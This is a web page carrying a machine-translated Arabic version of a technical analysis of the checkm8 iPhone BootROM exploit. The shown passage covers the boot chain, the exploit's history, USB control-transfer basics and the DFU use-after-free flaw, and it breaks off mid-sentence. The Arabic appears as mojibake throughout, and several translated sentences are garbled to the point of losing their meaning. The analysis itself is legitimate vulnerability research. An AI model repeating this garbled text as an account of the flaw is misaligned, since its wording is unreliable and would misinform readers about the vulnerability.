<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐คฐ๐ผ ๐๏ธ ๐ช ุงูุชุญููู ุงูููู ูู checkm8 ุงุณุชุบูุงู ๐ฅ ๐๐ผ ๐ฉ๐ฝโ๐คโ๐ฉ๐ป</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ุนูู ุงูุฃุฑุฌุญ ุณูุนุช ุจุงููุนู ุนู checkm8 ุงูุดููุฑ ููุงุณุชุบูุงู ุ ูุงูุฐู ูุณุชุฎุฏู ุซุบุฑุฉ ุฃูููุฉ ุบูุฑ BootROM ูู BootROM ููุนุธู iDevices ุ ุจูุง ูู ุฐูู iPhone X ูู ูุฐู ุงูููุงู...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ุงูุชุญููู ุงูููู ูู checkm8 ุงุณุชุบูุงู</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/" style=";text-align:right;direction:rtl"><div style="text-align:center;;text-align:right;direction:rtl"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p style=";text-align:right;direction:rtl"> ุนูู ุงูุฃุฑุฌุญ ุณูุนุช ุจุงููุนู ุนู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">checkm8</a> ุงูุดููุฑ ููุงุณุชุบูุงู ุ ูุงูุฐู ูุณุชุฎุฏู ุซุบุฑุฉ ุฃูููุฉ ุบูุฑ <code>BootROM</code> ูู <code>BootROM</code> ููุนุธู iDevices ุ ุจูุง ูู ุฐูู <code>iPhone X</code>  ูู ูุฐู ุงูููุงูุฉ ุ ุณูู ููุฏู ุชุญููููุง ุชููููุง ููุฐุง ุงูุงุณุชุบูุงู ููุนุฑูุฉ ุฃุณุจุงุจ ูุฐุง ุงูุถุนู. </p><a name="habracut"></a><br><p style=";text-align:right;direction:rtl">  ููููู ูุฑุงุกุฉ ุงููุณุฎุฉ ุงูุฑูุณูุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . </p><br><h2 id="introduction" style=";text-align:right;direction:rtl">  ููุฏูุฉ </h2><br><p style=";text-align:right;direction:rtl">  ุฃููุงู ุ ุฏุนูุง ูุตู ุจุฅูุฌุงุฒ ุนูููุฉ ุชูููุฏ iDevice ูุงูุฏูุฑ ุงูุฐู ููุนุจู <code>BootROM</code> (ุงููุนุฑูู ุฃูุถูุง ุจุงุณู <code>SecureROM</code> ) ููู.  ูุนูููุงุช ููุตูุฉ ุนู ุฐูู ูููู ุงูุนุซูุฑ ุนูููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> .  ุฅููู ูุง ูุจุฏู ุนููู ุงูุชุดุบูู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p style=";text-align:right;direction:rtl">  ุนูุฏ ุชุดุบูู ุงูุฌูุงุฒ ุ ูุชู ุชูููุฐ <code>BootROM</code> ุฃููุงู.  ููุงููุง ุงูุฑุฆูุณูุฉ ูู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุชููุฆุฉ ุงููุธุงู ุงูุฃุณุงุณู (ูุชู ุชุซุจูุช ุณุฌูุงุช ุงููุธุงู ุงูุฃุณุงุณู ุงูุถุฑูุฑูุฉ ุ ุชุชู ุชููุฆุฉ <code>CPU</code> ุ ููุง ุฅูู ุฐูู) </li><li style=";text-align:right;direction:rtl">  ุงูุชุญูู ูููู ุงูุณูุทุฑุฉ ุฅูู ุงููุฑุญูุฉ ุงูุชุงููุฉ <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุฏุนู <code>BootROM</code> ุชุญููู ุตูุฑ <code>IMG3/IMG4</code> </li><li style=";text-align:right;direction:rtl">  ูุฏู <code>BootROM</code> ุญู ุงููุตูู ุฅูู ููุชุงุญ <code>GID</code> ููู ุชุดููุฑ ุงูุตูุฑ </li><li style=";text-align:right;direction:rtl">  ููุชุญูู ูู ุงูุตูุฑ ุ ูุฏู <code>BootROM</code> ููุชุงุญ <code>Apple</code> ูุฏูุฌ ููุธููุฉ ุชุดููุฑ ุถุฑูุฑูุฉ </li></ul></li><li style=";text-align:right;direction:rtl">  ูู ุจุงุณุชุนุงุฏุฉ ุงูุฌูุงุฒ ุฅุฐุง ุชุนุฐุฑ ุฅุฌุฑุงุก ูุฒูุฏ ูู ุนูููุงุช ุงูุชุดุบูู ( <code>Device Firmware Update</code> ุ <code>DFU</code> ). </li></ul><br><p style=";text-align:right;direction:rtl">  <code>BootROM</code> ุตุบูุฑ ุฌุฏูุง ููููู ุชุณููุชู ุฅุตุฏุงุฑูุง ุฎููููุง ูู <code>iBoot</code> ุ ุญูุซ ูุดุงุฑู ูุนุธู ุงููุธุงู ูุฑูุฒ ุงูููุชุจุฉ.  ุนูู ุงูุฑุบู ูู ุฃูู ุนูู ุนูุณ <code>iBoot</code> ุ ูุง ูููู ุชุญุฏูุซ <code>BootROM</code> .  ูุชู ูุถุนูุง ูู ุงูุฐุงูุฑุฉ ุงูุฏุงุฎููุฉ ูููุฑุงุกุฉ ููุท ุนูุฏ ุชุตููุน ุงูุฌูุงุฒ.  <code>BootROM</code> ูู ุฌุฐุฑ ุงูุฃุฌูุฒุฉ ูู ุงูุซูุฉ ูุณูุณูุฉ ุงูุชูููุฏ ุงูุขูู.  ูุฏ ุชุณูุญ ููุงุท ุงูุถุนู ูู <code>BootROM</code> ููููุงุฌู ุจุงูุชุญูู ูู ุนูููุฉ ุงูุชูููุฏ ูุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุบูุฑ ุงููููุนุฉ ุนูู ุงูุฌูุงุฒ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8" style=";text-align:right;direction:rtl">  ุชุงุฑูุฎ checkm8 </h2><br><p style=";text-align:right;direction:rtl">  ุชูุช ุฅุถุงูุฉ <code>checkm8</code> ุงุณุชุบูุงู ุฅูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ipwndfu</a> ุจูุงุณุทุฉ ูุคูููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">axi0mX</a> ูู 27 ุณุจุชูุจุฑ 2019. ูู ุงูููุช ููุณู ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุฃุนูู</a> ุงูุชุญุฏูุซ ุนูู Twitter ููุฏู ูุตููุง ููุนูููุงุช ุฅุถุงููุฉ ุญูู ุงูุงุณุชุบูุงู.  ููููุง <code>iBoot</code> ุ ูุฌุฏ ุซุบุฑุฉ <code>use-after-free</code> ูู ุฑูุฒ <code>USB</code> ุฃุซูุงุก ุชุตุญูุญ <code>iBoot</code> ููุธุงู <code>iOS 12 beta</code> ูู ุตูู ุนุงู 2018. <br>  <code>BootROM</code> ู <code>iBoot</code> ูุนุธู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงูุฎุงุตุฉ ุจููุง ุ ุจูุง ูู ุฐูู <code>USB</code> ุ ูุจุงูุชุงูู ูุฅู <code>BootROM</code> ุงูุญุตุงูุฉ ูุฐู <code>BootROM</code> ุฃูุถูุง ุจู <code>BootROM</code> . </p><br><p style=";text-align:right;direction:rtl">  ููุง ููู ูู ุฑูุฒ ุงูุงุณุชุบูุงู ุ ูุชู ุงุณุชุบูุงู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ูู <code>DFU</code> .  ูุฐุง ูุถุน ูููู ูู ุฎูุงูู ููู ุตูุฑุฉ ูููุนุฉ ุฅูู ุฌูุงุฒ ุนุจุฑ <code>USB</code> ุณูุชู ุชูููุฏู ูุงุญููุง.  ุนูู ุณุจูู ุงููุซุงู ุ ูุฏ ูููู ูุฐุง ูููุฏูุง ูุงุณุชุนุงุฏุฉ ุงูุฌูุงุฒ ุจุนุฏ ุชุญุฏูุซ ุบูุฑ ูุงุฌุญ. </p><br><p style=";text-align:right;direction:rtl">  ูู ููุณ ุงูููู ุ ูุงู ุงููุณุชุฎุฏู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">littlelailo</a> ุฅูู ูุฌุฏ ูุฐู ุงูุซุบุฑุฉ ูุฑุฉ ุฃุฎุฑู ูู ูุงุฑุณ ููุดุฑ ูุตููุง ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">apollo.txt</a> .  ูุชุทุงุจู ุงููุตู ูุน <code>checkm8</code> ุ ุนูู ุงูุฑุบู ูู ุฃูู ููุณ ูู ุชูุงุตูู ุงูุงุณุชุบูุงู ุชุตุจุญ ูุงุถุญุฉ ุนูุฏ ูุฑุงุกุชู.  ูุฐุง ูู ุงูุณุจุจ ูู ุฃููุง ูุฑุฑูุง ูุชุงุจุฉ ูุฐู ุงูููุงูุฉ ููุตู ุฌููุน ุชูุงุตูู ุงูุงุณุชุบูุงู ุญุชู ุชูููุฐ ุงูุญูููุฉ ุงููุงูุนุฉ ูู <code>BootROM</code> . </p><br><p style=";text-align:right;direction:rtl">  <code>iBoot/SecureROM</code> ููุงุณุชุบูุงู ุนูู ุงูููุงุฑุฏ ุงููุฐููุฑุฉ ุฃุนูุงู <code>iBoot/SecureROM</code> ุงููุตุฏุฑูุฉ ูู <code>iBoot/SecureROM</code> ุ ูุงูุชู ุชู ุชุณุฑูุจูุง ูู ูุจุฑุงูุฑ 2018. ูุงุณุชุฎุฏููุง ุฃูุถูุง ุงูุจูุงูุงุช ุงูุชู ุญุตููุง ุนูููุง ูู ุงูุชุฌุงุฑุจ ุงูุชู ุฃุฌุฑูุช ุนูู ุฌูุงุฒ ุงูุงุฎุชุจุงุฑ ุงูุฎุงุต ุจูุง ุ <code>iPhone 7</code> ( <code>CPID:8010</code> ).  ุจุงุณุชุฎุฏุงู ุ <code>checkm8</code> ุ ุญุตููุง ุนูู ููุงูุจ <code>SecureROM</code> ู <code>SecureRAM</code> ุ ูุงูุชู ูุงูุช ุฃูุถูุง ูููุฏุฉ ููุชุญููู. </p><br><h2 id="necessary-info-about-usb" style=";text-align:right;direction:rtl">  ูุนูููุงุช ุถุฑูุฑูุฉ ุญูู USB </h2><br><p style=";text-align:right;direction:rtl">  ูุธุฑูุง ููุฌูุฏ ุซุบุฑุฉ ุฃูููุฉ ูู ุฑูุฒ <code>USB</code> ุ ููู ุงูุถุฑูุฑู ููู ููููุฉ ุนูู ูุฐู ุงููุงุฌูุฉ.  ูููู ุงูุนุซูุฑ ุนูู ุงูููุงุตูุงุช ุงููุงููุฉ ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">https://www.usb.org/</a> ุ ูููููุง ูุฑุงุกุฉ ุทูููุฉ.  ูุฃุบุฑุงุถูุง ุ ูุนุฏ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">USB ูู NutShell</a> ุฃูุซุฑ ูู ูุงูู.  ููุง ุ ุณูุฐูุฑ ููุท ุงูููุงุท ุงูุฃูุซุฑ ุตูุฉ. </p><br><p style=";text-align:right;direction:rtl">  ููุงู ุฃููุงุน ูุฎุชููุฉ ูู ููู ุจูุงูุงุช <code>USB</code> .  ูู <code>DFU</code> ุ ูุชู ุงุณุชุฎุฏุงู ูุถุน <code>Control Transfers</code> ููุท (ุงูุฑุฃ ุงููุฒูุฏ ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> ).  ูู ูุฐุง ุงููุถุน ุ ูู ูุนุงููุฉ ููุง 3 ูุฑุงุญู: </p><br><a name="setup_packet"></a><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>Setup Stage</code> - ูุชู ุฅุฑุณุงู ุญุฒูุฉ <code>SETUP</code> ุ  ูู ุงูุญููู ุงูุชุงููุฉ: <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>bmRequestType</code> - ูุญุฏุฏ ุงุชุฌุงู ุงูุทูุจ ูููุนู ูุงููุณุชูู </li><li style=";text-align:right;direction:rtl">  <code>bRequest</code> - ูุญุฏุฏ ุงูุทูุจ ุงููุทููุจ ุชูุฏููู </li><li style=";text-align:right;direction:rtl">  ูุชู ุชูุณูุฑ <code>wValue</code> ุ <code>wIndex</code> - ุญุณุจ ุงูุทูุจ </li><li style=";text-align:right;direction:rtl">  <code>wLength</code> - ูุญุฏุฏ ุทูู ุงูุจูุงูุงุช ุงููุฑุณูุฉ / ุงููุณุชููุฉ ูู <code>Data Stage</code> </li></ul></li><li style=";text-align:right;direction:rtl">  <code>Data Stage</code> - ูุฑุญูุฉ ุงุฎุชูุงุฑูุฉ ูููู ุงูุจูุงูุงุช.  ุจูุงุกู ุนูู ุญุฒูุฉ <code>SETUP</code> ุงููุฑุณูุฉ ุฃุซูุงุก <code>Setup Stage</code> ุ ูููู ุฅุฑุณุงู ุงูุจูุงูุงุช ูู ูุถูู ุฅูู ุฌูุงุฒ ( <code>OUT</code> ) ุฃู ุงูุนูุณ ( <code>IN</code> ).  ูุชู ุฅุฑุณุงู ุงูุจูุงูุงุช ูู ุฃุฌุฒุงุก ุตุบูุฑุฉ (ูู ุญุงูุฉ <code>Apple DFU</code> ุ ุชุจูุบ 0x40 ุจุงูุช). <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุนูุฏูุง ูุฑูุฏ ูุถูู ุฅุฑุณุงู ุฌุฒุก ุขุฎุฑ ูู ุงูุจูุงูุงุช ุ ูุฅูู ูุฑุณู ุฑูุฒ ูููุฒ <code>OUT</code> ุซู ุงูุจูุงูุงุช ููุณูุง. </li><li style=";text-align:right;direction:rtl">  ุนูุฏูุง ูููู ุงููุถูู ุฌุงูุฒูุง ูุงุณุชูุงู ุงูุจูุงูุงุช ูู ุฌูุงุฒ ุ ูุฅูู ูุฑุณู ุฑูุฒ <code>IN</code> ุฅูู ุงูุฌูุงุฒ. </li></ul></li><li style=";text-align:right;direction:rtl">  <code>Status Stage</code> - <code>Status Stage</code> ุงูุฃุฎูุฑุฉ ุ  ุชู ุงูุฅุจูุงุบ ุนู ุญุงูุฉ ุงููุนุงููุฉ ุจุงููุงูู. <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุจุงููุณุจุฉ ูุทูุจุงุช <code>OUT</code> ุ ูุฑุณู ุงููุถูู ุฑูุฒ <code>IN</code> ุงูุฐู ูุฌุจ ุฃู ูุณุชุฌูุจ ูู ุงูุฌูุงุฒ ูุน ุญุฒูุฉ ุฐุงุช ุทูู ุตูุฑู. </li><li style=";text-align:right;direction:rtl">  ูุทูุจุงุช <code>IN</code> ุ ูุฑุณู ุงููุถูู ุฑูุฒ <code>OUT</code> ูุญุฒูุฉ ุฐุงุช ุทูู ุตูุฑู. </li></ul></li></ul><br><p style=";text-align:right;direction:rtl">  ูุนุฑุถ ุงููุฎุทุท ุฃุฏูุงู ุทูุจุงุช <code>OUT</code> ู <code>IN</code> .  ููุฏ <code>ACK</code> ู <code>NACK</code> ูุญุฒู ุงููุตุงูุญุฉ ุงูุฃุฎุฑู ุนู ูุตุฏ ุ ูุฃููุง ููุณุช ูููุฉ ููุงุณุชุบูุงู ููุณู. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt" style=";text-align:right;direction:rtl">  ุชุญููู apollo.txt </h2><br><p style=";text-align:right;direction:rtl">  ุจุฏุฃูุง ุงูุชุญููู ุจุงุณุชุฎุฏุงู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">apollo.txt</a> .  ูุตู ุงููุณุชูุฏ ุฎูุงุฑุฒููุฉ ูุถุน <code>DFU</code> : </p><br><blockquote style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุนูุฏูุง ูุจุฏุฃ usb ูู ุงูุญุตูู ุนูู ุตูุฑุฉ ุนุจุฑ dfu ุ ูุณุฌู dfu ูุงุฌูุฉ ููุชุนุงูู ูุน ุฌููุน ุงูุฃูุงูุฑ ููุฎุตุต ูุฎุฒู ูุคูุช ููุฅุฏุฎุงู ูุงูุฅุฎุฑุงุฌ </li><li style=";text-align:right;direction:rtl">  ุฅุฐุง ููุช ุจุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู dfu ุ ุชุชู ูุนุงูุฌุฉ ุญุฒูุฉ ุงูุฅุนุฏุงุฏ ุจูุงุณุทุฉ ุงูููุฏ ุงูุฑุฆูุณู ุงูุฐู ูุณุชุฏุนู ุฑูุฒ ุงููุงุฌูุฉ </li><li style=";text-align:right;direction:rtl">  ูุชุญูู ุฑูุฒ ุงููุงุฌูุฉ ูู ุฃู ุทูู ุงูุทูู ุฃูุตุฑ ูู ุทูู ูุฎุฒู ุงูุฅุฏุฎุงู ุงููุคูุช ุงููุคูุช ูุฅุฐุง ูุงู ูุฐุง ูู ุงูุญุงู ุ ูุฅูู ูุชู ุชุญุฏูุซ ูุคุดุฑ ุชู ุชูุฑูุฑู ููุณูุทุฉ ูุน ูุคุดุฑ ุฅูู ุงููุฎุฒู ุงููุคูุช ููุฎุฑุฌ ุงูุฅุฏุฎุงู </li><li style=";text-align:right;direction:rtl">  ุซู ุชููู ุจุฅุฑุฌุงุน wLength ููู ุงูุทูู ุงูุฐู ุชุฑูุฏ ุงุณุชูุจุงูู ูู ุงููุฎุฒู ุงููุคูุช </li><li style=";text-align:right;direction:rtl">  ูููู ุงูููุฏ ุงูุฑุฆูุณู ูู usb ุจุชุญุฏูุซ var ุนุงููู ุจุทููู ููุณุชุนุฏ ูุงุณุชูุงู ุญุฒู ุงูุจูุงูุงุช </li><li style=";text-align:right;direction:rtl">  ูู ุญุงูุฉ ุชููู ุญุฒูุฉ ุจูุงูุงุช ุ ูุชู ูุชุงุจุชูุง ุฅูู ุงููุฎุฒู ุงููุคูุช ููุฎุฑุฌ ุงูุฅุฏุฎุงู ุนุจุฑ ุงููุคุดุฑ ุงูุฐู ุชู ุชูุฑูุฑู ููุณูุทุฉ ููุชู ุงุณุชุฎุฏุงู ูุชุบูุฑ ุนูููู ุขุฎุฑ ูุชุชุจุน ุนุฏุฏ ุงูุจุงูุชุงุช ุงูุชู ุชู ุงุณุชูุงููุง ุจุงููุนู </li><li style=";text-align:right;direction:rtl">  ุฅุฐุง ุชู ุงุณุชูุงู ุฌููุน ุงูุจูุงูุงุช ุ ูุชู ุงุณุชุฏุนุงุก ุฑูุฒ dfu ุงููุญุฏุฏ ูุฑุฉ ุฃุฎุฑู ุ ุซู ูุณุชูุฑ ูู ูุณุฎ ูุญุชููุงุช ุงููุฎุฒู ุงููุคูุช ููุฎุฑุฌ ุงูุฅุฏุฎุงู ุฅูู ูููุน ุงูุฐุงูุฑุฉ ูู ุญูุซ ูุชู ุชูููุฏ ุงูุตูุฑุฉ ูุงุญููุง </li><li style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูููู ุฑูุฒ USB ุจุฅุนุงุฏุฉ ุถุจุท ุฌููุน ุงููุชุบูุฑุงุช ูููุถู ูู ูุนุงูุฌุฉ ุงูุญุฒู ุงูุฌุฏูุฏุฉ </li><li style=";text-align:right;direction:rtl">  ุฅุฐุง ุชู ุฅููุงุก dfu ุ ูุชู ุชุญุฑูุฑ ุงููุฎุฒู ุงููุคูุช ููุฎุฑุฌ ุงูุฅุฏุฎุงู ูุฅุฐุง ูุดู ุชุญููู ุงูุตูุฑุฉ ููุชู ุฅุนุงุฏุฉ ูุฑุงุกุฉ bootrom </li></ol><br></blockquote><p style=";text-align:right;direction:rtl">  ุฃููุงู ุ ุชุญูููุง ูู ูุฐู ุงูุฎุทูุงุช ููุงุจู ุงูููุฏ ุงููุตุฏุฑู ูู <code>iBoot</code> .  ูุง ูููููุง ุงุณุชุฎุฏุงู ุฃุฌุฒุงุก ุงูููุฏ ุงูุฐู ุชู ุชุณุฑูุจู ููุง ุ ูุฐูู ุณูุณุชุฎุฏู ุงูููุฏ <code>SecureROM</code> ุงูุฐู ุญุตููุง ุนููู ูู ุงูููุฏุณุฉ ุงูุนูุณูุฉ ุงูุฎุงุตุฉ ุจู <code>SecureROM</code> ุงูุฎุงุต ุจู <code>iPhone7</code> ูู <code>IDA</code> .  ููููู ุจุณูููุฉ ุงูุนุซูุฑ ุนูู ุงูููุฏ ุงููุตุฏุฑู ูู <code>iBoot</code> ูุงูุชููู ููู. </p><br><p style=";text-align:right;direction:rtl">  ุนูุฏ ุชููุฆุฉ <code>DFU</code> ุ ูุชู ุชุฎุตูุต ูุฎุฒู ูุคูุช <code>IO</code> ุ ูุชุณุฌูู ูุงุฌูุฉ <code>USB</code> ููุนุงูุฌุฉ ุงูุทูุจุงุช ุฅูู <code>DFU</code> : </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p style=";text-align:right;direction:rtl">  ุนูุฏ ุธููุฑ ุญุฒูุฉ <code>SETUP</code> ูุทูุจ <code>DFU</code> ุ ูุชู ุงุณุชุฏุนุงุก ูุนุงูุฌ ูุงุฌูุฉ ููุงุณุจ.  ุจุงููุณุจุฉ ูุทูุจุงุช <code>OUT</code> (ุนูู ุณุจูู ุงููุซุงู ุ ุนูุฏ ุฅุฑุณุงู ุตูุฑุฉ) ุ ูู ุญุงูุฉ ุงูุชูููุฐ ุงููุงุฌุญ ุ ูุชุนูู ุนูู ุงููุนุงูุฌ ุฅุฑุฌุงุน ุนููุงู ุงููุฎุฒู ุงููุคูุช <code>IO</code> ูููุนุงููุฉ ุจุงูุฅุถุงูุฉ ุฅูู ุทูู ุงูุจูุงูุงุช ุงูุชู ูุชููุน ุชููููุง.  ูุชู ุชุฎุฒูู ูู ุงูููู ูู ูุชุบูุฑุงุช ุนููููุฉ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p style=";text-align:right;direction:rtl">  ุชูุถุญ ููุทุฉ ุงูุดุงุดุฉ ุฃุฏูุงู ูุนุงูุฌ ูุงุฌูุฉ <code>DFU</code> .  ุฅุฐุง ูุงู ุงูุทูุจ ุตุญูุญูุง ุ ูุณูุชู ุฅุฑุฌุงุน ุนููุงู ุงููุฎุฒู ุงููุคูุช <code>IO</code> ุงููุฎุตุต ุฃุซูุงุก ุชููุฆุฉ <code>DFU</code> ูุงูุทูู ุงููุชููุน ููุจูุงูุงุช ูู ุญุฒูุฉ <code>SETUP</code> . </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p style=";text-align:right;direction:rtl">  ุฃุซูุงุก <code>Data Stage</code> ุ ุชุชู ูุชุงุจุฉ ูู ุฌุฒุก ูู ุงูุจูุงูุงุช ุฅูู ุงููุฎุฒู ุงููุคูุช <code>IO</code> ุ ุซู ูุชู ุฅุฒุงุญุฉ ุนููุงู ุงููุฎุฒู ุงููุคูุช <code>IO</code> ููุชู ุชุญุฏูุซ ุงูุนุฏุงุฏ ุงููุณุชูู.  ุนูุฏูุง ูุชู ุงุณุชูุงู ุฌููุน ุงูุจูุงูุงุช ุงููุชููุนุฉ ุ ูุชู ุงุณุชุฏุนุงุก ูุนุงูุฌ ุจูุงูุงุช ุงููุงุฌูุฉ ููุชู ูุณุญ ุงูุญุงูุฉ ุงูุนุงูุฉ ูููุนุงููุฉ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p style=";text-align:right;direction:rtl">  ูู ูุนุงูุฌ ุจูุงูุงุช <code>DFU</code> ุ ูุชู ููู ุงูุจูุงูุงุช ุงููุณุชููุฉ ุฅูู ููุทูุฉ ุงูุฐุงูุฑุฉ ุงูุชู ุณูุชู ุชุญููููุง ูููุง ูุงุญููุง.  ุงุณุชูุงุฏูุง ุฅูู ุดูุฑุฉ ูุตุฏุฑ <code>iBoot</code> ุ <code>iBoot</code> ูุฐู ุงูููุทูุฉ ุนูู ุฃุฌูุฒุฉ <code>Apple</code> <code>INSECURE_MEMORY</code> . </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p style=";text-align:right;direction:rtl">  ุนูุฏูุง ูุฎุฑุฌ ุงูุฌูุงุฒ ูู ูุถุน <code>DFU</code> ุ ูุชู ุชุญุฑูุฑ ุงููุฎุฒู ุงููุคูุช <code>IO</code> ุงููุฎุตุต ูุณุจููุง.  ุฅุฐุง ุชู ุงูุญุตูู ุนูู ุงูุตูุฑุฉ ุจูุฌุงุญ ูู ูุถุน <code>DFU</code> ุ ูุณูุชู ุงูุชุญูู ูููุง ูุชูููุฏูุง.  ุฅุฐุง ูุงู ููุงู ุฃู ุฎุทุฃ ุฃู ูุงู ูู ุงููุณุชุญูู ุชุดุบูู ุงูุตูุฑุฉ ุ ูุณุชุชู ุชููุฆุฉ ูุญุฏุฉ <code>DFU</code> ูุฑุฉ ุฃุฎุฑู ุ ูุณุชุชูุฑุฑ ุงูุนูููุฉ ุจุฑูุชูุง ูู ุงูุจุฏุงูุฉ. </p><br><p style=";text-align:right;direction:rtl">  ุชุญุชูู ุงูุฎูุงุฑุฒููุฉ ุงูููุถุญุฉ <code>use-after-free</code> ุซุบุฑุฉ ุฃูููุฉ ูู <code>use-after-free</code> .  ุฅุฐุง ุฃุฑุณููุง ุญุฒูุฉ <code>SETUP</code> ูู ููุช ุชุญููู ุงูุตูุฑ ูุฃููู ุนูููุฉ ุชุฎุทู <code>Data Stage</code> ุ ูุณุชุจูู ุงูุญุงูุฉ ุงูุนุงูุฉ ููุฏ ุงูุชููุฆุฉ ุฎูุงู ุฏูุฑุฉ <code>DFU</code> ุงูุชุงููุฉ ุ ูุณูููู ูุงุฏุฑูู ุนูู ุงููุชุงุจุฉ ุฅูู ุนููุงู ุงููุฎุฒู ุงููุคูุช <code>IO</code> ุงููุฎุตุต ุฎูุงู ุงูุณุงุจู ุงูุชูุฑุงุฑ ูู <code>DFU</code> . </p><br><p style=";text-align:right;direction:rtl">  ูุงูุขู ุจุนุฏ ุฃู ุนุฑููุง ููู ุชุนูู <code>use-after-free</code> ุ ูุฅู ุงูุณุคุงู ูู ุ ููู ูููููุง ุงููุชุงุจุฉ ููู 